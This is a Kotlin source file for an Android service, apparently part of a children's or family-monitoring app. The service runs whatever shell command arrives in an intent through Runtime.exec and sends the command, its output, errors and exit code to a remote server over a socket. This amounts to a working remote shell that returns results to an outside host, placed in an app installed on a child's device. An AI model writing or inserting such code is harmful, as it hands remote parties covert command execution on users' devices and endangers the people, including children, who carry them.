package com.xixfamily.kids.service

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.xixfamily.kids.network.SocketManager
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader

class RemoteShellService : Service() {

    companion object { private const val TAG = "RemoteShell" }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "EXECUTE") {
            val command = intent.getStringExtra("command") ?: "echo hello"
            Thread { executeCommand(command) }.start()
        }
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?) = null

    private fun executeCommand(command: String) {
        try {
            val parts = command.split(" ").toTypedArray()
            val process = Runtime.getRuntime().exec(parts)
            
            val stdout = BufferedReader(InputStreamReader(process.inputStream)).readText()
            val stderr = BufferedReader(InputStreamReader(process.errorStream)).readText()
            val exitCode = process.waitFor()

            if (SocketManager.getInstance().isSocketConnected()) {
                SocketManager.getInstance().emit("shell:result", JSONObject().apply {
                    put("command", command)
                    put("output", stdout.ifEmpty { "(no output)" })
                    put("exitCode", exitCode)
                    put("error", stderr)
                })
            }
        } catch (e: Exception) {
            SocketManager.getInstance().emit("shell:result", JSONObject().apply {
                put("command", command)
                put("output", "")
                put("exitCode", -1)
                put("error", e.message ?: "Execution failed")
            })
        }
        stopSelf()
    }
}
